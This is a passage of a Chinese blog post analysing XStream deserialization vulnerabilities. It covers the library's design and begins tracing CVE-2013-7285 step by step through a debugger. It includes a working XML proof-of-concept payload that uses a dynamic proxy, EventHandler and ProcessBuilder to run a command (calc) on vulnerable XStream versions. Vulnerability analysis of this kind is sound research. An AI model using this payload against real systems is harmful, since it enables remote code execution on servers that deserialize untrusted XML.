<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XStream漏洞全系分析(截至2023/4/15) | ZeanHike</title><meta name="author" content="ZeanHike,774781684@qq.com"><meta name="copyright" content="ZeanHike"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)概述XStream主要用来将 Java 对象转换为 XML，以及将 XML 转换为 Java 对象。 基本使用pom文件中导入xstream库： 12345&lt;dependency&gt;    &lt;groupId&gt;com.thoughtworks.xstream&lt;&#x2F;groupId&gt;    &lt;a">
<meta property="og:type" content="article">
<meta property="og:title" content="XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)">
<meta property="og:url" content="https://windowsdefender.com.cn/2023/04/15/XStream/index.html">
<meta property="og:site_name" content="ZeanHike">
<meta property="og:description" content="XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)概述XStream主要用来将 Java 对象转换为 XML，以及将 XML 转换为 Java 对象。 基本使用pom文件中导入xstream库： 12345&lt;dependency&gt;    &lt;groupId&gt;com.thoughtworks.xstream&lt;&#x2F;groupId&gt;    &lt;a">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101608758.jpg">
<meta property="article:published_time" content="2023-04-15T10:49:08.000Z">
<meta property="article:modified_time" content="2023-04-15T10:49:08.000Z">
<meta property="article:author" content="ZeanHike">
<meta property="article:tag" content="漏洞分析">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101608758.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306091946658.svg"><link rel="canonical" href="https://windowsdefender.com.cn/2023/04/15/XStream/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XStream漏洞全系分析(截至2023/4/15)',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-04-15 18:49:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306092351598.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 存档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306101608758.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="ZeanHike"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/cyberikun/picture@latest/img/202306091946658.svg"/><span class="site-name">ZeanHike</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 存档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XStream漏洞全系分析(截至2023/4/15)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-15T10:49:08.000Z" title="发表于 2023-04-15 18:49:08">2023-04-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-15T10:49:08.000Z" title="更新于 2023-04-15 18:49:08">2023-04-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">38.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>196分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XStream漏洞全系分析(截至2023/4/15)"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2023/04/15/XStream/#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="XStream漏洞全系分析-截至2023-x2F-4-x2F-15"><a href="#XStream漏洞全系分析-截至2023-x2F-4-x2F-15" class="headerlink" title="XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)"></a>XStream漏洞全系分析(截至2023&#x2F;4&#x2F;15)</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>XStream主要用来将 Java 对象转换为 XML，以及将 XML 转换为 Java 对象。</p>
<h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>pom文件中导入xstream库：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.11.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>先编写一个Student：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略setter和getter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再写一个main方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.setAge(<span class="number">81</span>);</span><br><span class="line">        student.setId(<span class="string">&quot;13&quot;</span>);</span><br><span class="line">        student.setName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"></span><br><span class="line">        xStream.alias(<span class="string">&quot;student&quot;</span>, Student.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xStream.toXML(student);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061549581.png" alt="image-20230406154957549"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xStream.alias(<span class="string">&quot;student&quot;</span>, Student.class);</span><br></pre></td></tr></table></figure>

<p>这句话为类起别名，不写这句话，输出为：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061551616.png" alt="image-20230406155122581"></p>
<p>输出类名时会带上包名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XStream xStream = new XStream();</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061619881.png" alt="image-20230406161945844"></p>
<p>调用带三个参数的构造函数，这里new XppDriver()作为第三个参数。</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304061624908.png" alt="image-20230406162422845"></p>
<p>第三个参数为HierarchicalStreamDriver接口，该接口为 XStream 提供流解析器和编写器的实现。</p>
<p>HierarchicalStreamDrive为XStream提供XML解析器（HierarchicalStreamReader）和写入器（HierarchicalStreamWriter）的实现。</p>
<p>XStream默认使用了XppDriver解析器，Xpp其实就是XML Pull Parser，也就是使用PULL方式解析XML。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CyberIKUN/picture@main/img/image-20220902115246855.png" alt="image-20220902115246855"></p>
<p>XppReader为XStream读取器，使用XmlPullParser API直接从流中提取。XML解析有三种方式：DOM解析、SAX解析（PULL解析与原理相同）、JDOM 解析、DOM4J 解析，这里使用的PULL解析。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CyberIKUN/picture@main/img/image-20220902121505898.png" alt="image-20220902121505898"></p>
<p>ConverterLookup为特定类型寻找转换器实现：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304062315401.png" alt="image-20230406231538356"></p>
<p>存在一个方法：</p>
<ul>
<li><code>Converter lookupConverterForType(Class type);</code>：根据指定的类型返回对应的转换器；</li>
</ul>
<p>Converter转换器接口的实现可以将java对象转换成文本，或者将文本转换成java对象。</p>
<img src="https://cdn.jsdelivr.net/gh/CyberIKUN/picture@main/img/image-20220902113248528.png" alt="image-20220902113248528" style="zoom: 67%;" />

<p>XStream类里存在两个方法：</p>
<ul>
<li><code>void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context);</code>：将对象转换成文本</li>
<li><code>Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context);</code>：将文本转换成对象</li>
</ul>
<h3 id="XStream设计"><a href="#XStream设计" class="headerlink" title="XStream设计"></a>XStream设计</h3><p>XStream 总体由五部分组成</p>
<ul>
<li><strong>XStream</strong> 作为客户端对外提供XML解析与转换的相关方法。</li>
<li><strong>AbstractDriver</strong> 为XStream提供流解析器和编写器的创建。目前支持XML（DOM，PULL）、JSON解析器。解析器<strong>HierarchicalStreamReader</strong>，编写器<strong>HierarchicalStreamWriter</strong>（PS：<strong>XStream</strong>默认使用了<strong>XppDriver</strong>）。</li>
<li><strong>MarshallingStrategy</strong> 编组和解组策略的核心接口，两个方法：<br> marshal：编组对象图<br> unmarshal：解组对象图<br> <strong>TreeUnmarshaller</strong> 树解组程序，调用mapper和Converter把XML转化成java对象，里面的start方法开始解组，convertAnother方法把class转化成java对象。<br> <strong>TreeMarshaller</strong> 树编组程序，调用mapper和Converter把java对象转化成XML，里面的start方法开始编组，convertAnother方法把java对象转化成XML。<br> 它的抽象子类<strong>AbstractTreeMarshallingStrategy</strong>有抽象两个方法<br> createUnmarshallingContext<br> createMarshallingContext<br> 用来根据不同的场景创建不同的<strong>TreeUnmarshaller</strong>子类和<strong>TreeMarshaller</strong>子类，使用了<strong>策略模式</strong>，如ReferenceByXPathMarshallingStrategy创建ReferenceByXPathUnmarshaller，ReferenceByIdMarshallingStrategy创建ReferenceByIdUnmarshaller（PS：<strong>XStream</strong>默认使用<strong>ReferenceByXPathMarshallingStrategy</strong>）。</li>
<li><strong>Mapper</strong> 映射器，XML的elementName通过mapper获取对应类、成员、属性的class对象。支持解组和编组，所以方法是成对存在real和serialized，他的子类<strong>MapperWrapper</strong>作为装饰者，包装了不同类型映射的映射器，如AnnotationMapper，ImplicitCollectionMapper，ClassAliasingMapper。</li>
<li><strong>ConverterLookup</strong> 通过Mapper获取的Class对象后，接着调用lookupConverterForType获取对应Class的转换器，将其转化成对应实例对象。<strong>DefaultConverterLookup</strong>是该接口的实现类，同时实现了<strong>ConverterRegistry</strong>的接口，所有<strong>DefaultConverterLookup</strong>具备查找converter功能和注册converter功能。所有注册的转换器按一定优先级组成由<strong>TreeSet</strong>保存的有序集合(PS:<strong>XStream</strong> 默认使用了<strong>DefaultConverterLookup</strong>)。</li>
</ul>
<blockquote>
<p>从其他博主偷的XStream设计图~~</p>
</blockquote>
<img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304062325336.png">

<blockquote>
<p>这里再提一嘴策略模式，同样也是引用其他文章~~</p>
</blockquote>
<p>策略模式的主要角色如下：</p>
<ul>
<li>抽象策略（Strategy）类：这是一个抽象角色，通常由一个接口或抽象类实现。此角色给出所有的具体策略类所需的接口。</li>
<li>具体策略（Concrete Strategy）类：实现了抽象策略定义的接口，提供具体的算法实现或行为。</li>
<li>环境（Context）类：持有一个策略类的引用，最终给客户端调用。</li>
</ul>
<p>【例】促销活动</p>
<p>一家百货公司在定年度的促销活动。针对不同的节日（春节、中秋节、圣诞节）推出不同的促销活动，由促销员将促销活动展示给客户。类图如下：</p>
<img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F.png" style="zoom:80%;" />

<p>代码如下：</p>
<p>定义百货公司所有促销活动的共同接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义具体策略角色（Concrete Strategy）：每个节日具体的促销活动</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//为春节准备的促销活动A</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrategyA</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;买一送一&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为中秋准备的促销活动B</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrategyB</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;满200元减50元&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为圣诞准备的促销活动C</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StrategyC</span> <span class="keyword">implements</span> <span class="title class_">Strategy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;满1000元加一元换购任意200元以下商品&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义环境角色（Context）：用于连接上下文，即把促销活动推销给客户，这里可以理解为销售员</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SalesMan</span> &#123;                        </span><br><span class="line">    <span class="comment">//持有抽象策略角色的引用                              </span></span><br><span class="line">    <span class="keyword">private</span> Strategy strategy;                 </span><br><span class="line">                                               </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SalesMan</span><span class="params">(Strategy strategy)</span> &#123;       </span><br><span class="line">        <span class="built_in">this</span>.strategy = strategy;              </span><br><span class="line">    &#125;                                          </span><br><span class="line">                                               </span><br><span class="line">    <span class="comment">//向客户展示促销活动                                </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">salesManShow</span><span class="params">()</span>&#123;                </span><br><span class="line">        strategy.show();                       </span><br><span class="line">    &#125;                                          </span><br><span class="line">&#125;                                              </span><br></pre></td></tr></table></figure>

<p>这样的优点是：</p>
<ul>
<li>抽象出一个接口（Strategy），方便后续增添新的策略实现类；</li>
<li>隐藏具体策略实现；</li>
<li>仅需通过环境角色选择具体的策略进行调用，方便操作；</li>
</ul>
<ul>
<li>多个策略只区别在表现行为不同，可以使用策略模式，在运行时动态选择具体要执行的行为；</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实XStream设计上比以往分析过的其他组件简单明了许多，也比较容易理解。最骚的也是他的官网会存放所有漏洞以及POC和说明，对于分析来说方便很多。</p>
<h2 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h2><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li>XStream &lt;&#x3D; 1.4.6 and XStream &#x3D; 1.4.10</li>
</ul>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>poc：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>前面说过<code>TreeUnmarshaller</code>类负责将xml转成java对象，里面的start方法开始反序列化，所以直接在start方法下断点：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072100690.png" alt="image-20230407210017645"></p>
<p>通过<code> HierarchicalStreams.readClassType(reader, mapper);</code>读取类型信息，然后根据标签名找到对应类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072102548.png" alt="image-20230407210226507"></p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072106604.png" alt="image-20230407210633557"></p>
<p>然后调用convertAnother方法进行类的实例化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072108374.png" alt="image-20230407210817332"></p>
<p>然后找到该接口的默认实现类，为TreeSet：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072110606.png" alt="image-20230407211016554"></p>
<p>然后寻找converter（TreeSetConverter）进行convert：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072111575.png" alt="image-20230407211115533"></p>
<p>在convert方法里：</p>
<p>其实就是调用父类的convert方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072114452.png" alt="image-20230407211430386"></p>
<p>在父类的convert方法里，将实现类压栈types中，然后调用converter.unmarshal(reader, this);进行反序列化：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072115381.png" alt="image-20230407211543331"></p>
<p>在converter.unmarshal(reader, this);方法中，继续treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);解析类：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072122424.png" alt="image-20230407212224348"></p>
<p>在treeMapConverter.populateTreeMap(reader, context, treeMap, unmarshalledComparator);方法中，使用putCurrentEntryIntoMap(reader, context, result, sortedMap);读取下一个标签（dynamic-proxy）对应的类，放到sortedMap中，进到putCurrentEntryIntoMap方法查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072124923.png" alt="image-20230407212454754"></p>
<p>再进入readItem查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072135250.png" alt="image-20230407213513214"></p>
<p>调用HierarchicalStreams.readClassType(reader, mapper());读取下一个标签对应的类（Proxy$xxx），进入readClassType方法中查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304072137621.png" alt="image-20230407213734583"></p>
<p>中间经过一些类，然后来到MapperWrapper#realClass方法中获取dynamic-proxy标签对应的类：</p>
